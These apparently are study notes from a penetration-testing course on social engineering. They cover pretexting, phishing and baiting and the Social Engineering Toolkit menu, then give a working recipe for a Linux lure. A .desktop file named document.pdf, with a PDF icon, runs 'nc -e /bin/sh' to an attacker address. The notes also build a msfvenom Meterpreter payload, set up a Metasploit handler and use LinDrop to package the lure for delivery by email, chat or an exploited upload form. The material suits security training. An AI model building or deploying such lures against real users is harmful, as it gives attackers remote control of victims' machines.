# Network Security

## Social Engineering

### What Is It - Study Guide

(02/08) *Social Engineering* is an hacking technique in which we exploit the human factor (company employess): be helpful/fear of troubles/trust people, in order to yield information or install malware.
It is often overlooked but the ability of tricking people is very important nowdays.

### Types of Social Engineering - Study Guide

(03/10) *Pretexting*: placing a person in a realistic but fake situation (an help desk employee assisting another target employee).
(05/10) *Phishing*: utilizes fraudolent emails. Spear phishing/whaling: targets specific group of individuals/executives in an organization.
(07/10) *Baiting*: takes advantage of people curiosity using a left media.
(09/10) *Physical*: gaining access to restricted areas, often using piggybacking/shadowing.

### Tools - Study Guide

(02/15) *Social Engineering Toolkit (SET)*: is a framework designed for social engineering attacks (create phishing pages and fake mails, infect media, bind Metasploit exploits):
```
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) Wireless Access Point Attack Vector
8) QRCode Generator Attack Vector
9) Powershell Attack Vectors
10) Third Party Modules
```

#### Social Engineering Linux Targets - Video

Create a social engineering roost for targeting users of Linux systems exploiting the `.desktop` files.
To create a `.desktop` file (masqueraded as `document.pdf`) that when opened runs a reverse shell to our attacker machine:
`nano test.desktop`:
```
[Desktop Entry]
Type=Application
Name=document.pdf
Exec=/bin/nc -e /bin/sh <AttackerIP> <AttackerPort>
```
`chmod +x test.desktop`.

Now, we can perfect our attack vector changing its icon:
`locate *pdf.svg`: to choose an existent icon we need to know which is the victim OS.
`nano test.desktop`:
```
[Desktop Entry]
Type=Application
Name=document.pdf
Exec=/bin/nc -e /bin/sh <AttackerIP> <AttackerPort>
Icon=/usr/share/icons/Humanity/mimes/22/application-pdf.svg
```

In addition, we can create an enhanced attack vector using *LinDrop* tool.
`locate *.pdf`, `cp /usr/share/doc/lmodern/lm-info.pdf /root/Desktop/tools/LinDrop`: we need a real pdf to show when the `.desktop` file is launched.
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<AttackerIP> LPORT=<AttackerPort> -f elf -o /root/Desktop/tools/LinDrop/reverse_tcp_linux`: to create a reverse shell Linux payload.
`cd /root/Desktop/tools/LinDrop`, `python -m SimpleHTTPServer 80`: to run an HTTP server from the attacker machine LinDrop folder.
`msfconsole -q`, `use exploit/multi/handler`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `set LHOST <AttackerIP>`, `set LPORT <AttackerPort>`, `exploit -j` : to create an handler for our listener.

`python LinDrop`: here we need to set up the output filename, the remote PDF we want to show, and the remote payload we want to execute.

Now, as output we have a .zip file we need to extract, and then we can send its content (the final `.desktop` file) via email or chat software, upload it to an organization website (ideally via an exploited upload form), and so on.
This file, once opened, will show to the user the chosen PDF file, and then our malicious payload will be downloaded and executed, resulting in a reverse Meterpreter shell.

---
